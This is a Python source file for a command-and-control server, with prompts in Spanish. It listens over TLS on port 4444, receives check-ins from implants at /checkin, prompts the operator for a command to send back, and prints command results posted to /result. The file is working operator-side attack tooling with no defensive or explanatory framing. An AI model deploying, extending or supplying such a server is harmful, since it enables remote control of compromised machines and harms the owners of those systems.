from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import json
from socketserver import ThreadingMixIn

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    pass

class C2Handler(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        if self.path == '/checkin':
            data = json.loads(post_data)
            print(f"\n[+] Conexión de: {data.get('session')}")
            
            cmd = input("Comando a ejecutar (o Enter para omitir): ")
            response = {"cmd": cmd} if cmd else {}
            
            self._set_headers()
            self.wfile.write(json.dumps(response).encode())
        
        elif self.path == '/result':
            data = json.loads(post_data)
            print("\n[+] Resultado del comando:")
            print(data.get('output', 'Sin resultado'))
            
            self._set_headers()

def run_server():
    server_address = ('0.0.0.0', 4444)
    httpd = ThreadedHTTPServer(server_address, C2Handler)
    
    # Configurar SSL
    httpd.socket = ssl.wrap_socket(
        httpd.socket,
        server_side=True,
        certfile='./resources/cert.pem',
        keyfile='./resources/key.pem',
        ssl_version=ssl.PROTOCOL_TLS
    )
    
    print("[*] Servidor C2 iniciado en https://0.0.0.0:4444")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
